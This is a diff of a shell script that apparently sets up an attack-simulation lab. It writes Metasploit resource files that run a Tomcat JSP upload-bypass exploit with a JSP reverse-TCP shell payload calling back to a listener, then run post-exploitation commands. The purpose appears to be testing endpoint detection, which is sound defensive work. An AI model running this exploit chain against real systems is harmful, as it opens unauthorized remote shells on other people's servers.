@@ -19,7 +19,7 @@ startup ()
 create_kali_macros ()
 {
 	# shellcheck disable=SC2024
-	sudo cat >/home/kali/configure.rc <<EOL
+	sudo cat >/home/ubuntu/configure.rc <<EOL
 use exploit/multi/http/tomcat_jsp_upload_bypass
 set RHOSTS ${TARGET_ADDRESS}
 set LHOST ${LHOST}
@@ -29,31 +29,31 @@ EOL
 	
 
 	# shellcheck disable=SC2024
-	sudo cat >/home/kali/startup.rc <<EOL
+	sudo cat >/home/ubuntu/startup.rc <<EOL
 use exploit/multi/http/tomcat_jsp_upload_bypass
 set rhosts ${TARGET_ADDRESS}
 set rport ${TARGET_PORT}
 set LHOST ${LHOST}
 set LPORT ${LPORT}
-set REVERSELISTNERBINDADDRESS ${PRIVATE_IPADDRESS}
+set REVERSELISTENERBINDADDRESS ${PRIVATE_IPADDRESS}
 set AutoRunScript post_exploit.rc
 set payload java/jsp_shell_reverse_tcp
 exploit -j
 EOL
 
 	# shellcheck disable=SC2024
-	sudo cat >/home/kali/post_exploit.rc <<'EOL'
+	sudo cat >/home/ubuntu/post_exploit.rc <<'EOL'
 whoami
 netstat -ano
 bash crowdstrike_test_high
 EOL
-	sudo chown kali:kali /home/kali/*.rc
+	sudo chown ubuntu:ubuntu /home/ubuntu/*.rc
 }
 
 setup_aliases ()
 {
 	# shellcheck disable=SC2024
-	sudo cat >>/home/kali/.zshrc <<'EOL'
+	sudo cat >>/home/ubuntu/.bashrc <<'EOL'
 function check_tomcat() {
 	while true; do
 	  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://${TARGET_ADDRESS}:${TARGET_PORT}")
